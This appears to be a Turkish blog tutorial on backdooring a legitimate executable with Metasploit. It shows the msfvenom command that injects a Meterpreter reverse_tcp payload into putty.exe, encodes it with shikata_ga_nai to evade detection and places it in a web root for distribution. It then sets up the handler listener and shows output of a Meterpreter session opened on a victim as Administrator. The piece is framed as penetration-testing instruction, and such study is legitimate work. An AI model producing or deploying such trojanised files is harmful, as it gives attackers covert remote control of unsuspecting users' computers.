---
draft: false

title:  'MSF EXE Arka Kapısı'
date: '2017-06-16T14:00:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Bir hedef bilgisayara yönelik olarak özel bir .exe dosyası oluşturmak ve içine kodlar gömmek gerçekten uzun zaman alabilir. Bunun yerine, zaten var olan bir .exe uzantılı dosyanın içine, Metasploit Payload modülleri yerleştirebilirsiniz.' 
 
url:  /tr/msf-exe-arka-kapisi/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


## Bir EXE Dosyası İle Arka Kapı Oluşturma



Bir hedef bilgisayara yönelik olarak özel bir .exe dosyası oluşturmak ve içine kodlar gömmek gerçekten uzun zaman alabilir. Bunun yerine, zaten var olan bir .exe uzantılı dosyanın içine, Metasploit Payload modülleri yerleştirebilirsiniz.



Bu yazıda, bir .exe dosyasının içine, Metasploit Payload yerleştirip encode etmeyi göreceğiz. Bu sayede, kodlanmış özel .exe dosyasını çalıştıran kullanıcının bilgisayarından bizim bilgisayarımıza Meterpreter oturum açılacaktır.



## Exe Dosyası İndirme



Örneğimizde, `putty.exe` isimli dosyayı kullanacağız. Öncelikle bu dosyayı indirelim. Encode edilmiş .exe dosyamızı web sayfasından dağıtacağımıza göre, Kali Linux içinde sunucumuzun bulunduğu `/var/www/` klasörüne gidelim ve indirmeyi aşağıdaki komut ile başlatalım.


```bash
root@kali:/var/www# wget <a href="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</a>
--2015-07-21 12:01:27--  <a href="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</a>

Resolving the.earth.li (the.earth.li)... 46.43.34.31, 2001:41c8:10:b1f:c0ff:ee:15:900d
Connecting to the.earth.li (the.earth.li)|46.43.34.31|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: <a href="http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe">http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe</a> **[**following]
--2015-07-21 12:01:27--  <a href="http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe">http://the.earth.li/~sgtatham/putty/0.64/x86/putty.exe</a>
Reusing existing connection to the.earth.li:80.
HTTP request sent, awaiting response... 200 OK
Length: 524288 (512K) **[**application/x-msdos-program]
Saving to: `putty.exe'

100%[=========================================================================================================>] 524,288      815K/s   in 0.6s    

2015-07-21 12:01:28 (815 KB/s) - `putty.exe' saved **[**524288/524288]

root@kali:/var/www#
```



Şimdi, bu indirdiğimiz `putty.exe` dosyasının içine, `msfvenom` komutunu kullanarak bir Metasploit Payload modülünü yerleştireceğiz. Yerleştireceğimiz modül, `windows/meterpreter/reverse_tcp` modülüdür ve LHOST olarak kendi IP adresimiz olan 192.168.1.101 IP adresini ayarlayacağız.



Next, we use msfvenom to inject a meterpreter reverse payload into our executable and encoded it 3 times using shikata_ga_nai and save the backdoored file into our web root directory.



root@kali:/var/www# msfvenom -a x86 –platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe -o puttyX.exe



Found 1 compatible encoders Attempting to encode payload with 3 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 326 (iteration=0) x86/shikata_ga_nai succeeded with size 353 (iteration=1) x86/shikata_ga_nai succeeded with size 380 (iteration=2) x86/shikata_ga_nai chosen with final size 380 Payload size: 380 bytes Saved as: puttyX.exe root@kali:/var/www#


```bash

İşlem başarıyla sonuçlandığında elimizde ```puttyX.exe``` isimli kodlanmış ve içine payload yerleştirilmiş bir çalıştırılabilir dosya bulunmaktadır.

.exe dosyasının içine, reverse payload yerleştirildiğine göre, bu payload bizim yerel bilgisayarımıza bağlanmak isteyecektir. O zaman, ```msfconsole``` içerisinde bir dinleyici modül çalıştırmalıyız ki bağlantı mümkün olsun.

Bunun için ```exploit/multi/handler``` modülünü kullanalım ve gerekli ayarları yapalım.

```sh
msf > use exploit/multi/handler 

msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp 
PAYLOAD => windows/meterpreter/reverse_tcp

msf exploit(handler) > set LHOST 192.168.1.101
LHOST => 192.168.1.101

msf exploit(handler) > set LPORT 443
LPORT => 443

msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.1.101:443 
[*] Starting the payload handler...
```



Artık dinleme modülü de çalışmaktadır. Bu aşamadan sonra yapılması gereken, oluşturduğumuz .exe dosyasını web üzerinden dağıtmaktır. Herhangi bir kullanıcı bu dosyayı çalıştırdığında, otomatik olarak yerel bilgisayarımıza bağlanacak ve Meterpreter oturumu açılacaktır.


```bash
> Sending stage (749056 bytes) to 192.168.1.201
> Meterpreter session 1 opened (192.168.1.101:443 -> 192.168.1.201:1189) at Sat Feb 05 08:54:25 -0700 2011

meterpreter > getuid
Server username: XEN-XP-SPLOIT\Administrator
meterpreter >
```



Bu yazıda anlatılan işlemler ve .exe dosyasının dağıtılması, göründüğünden daha uzun süre alabilir. Burada sadece işlemin mantığı açıklanmaya çalışılmıştır.
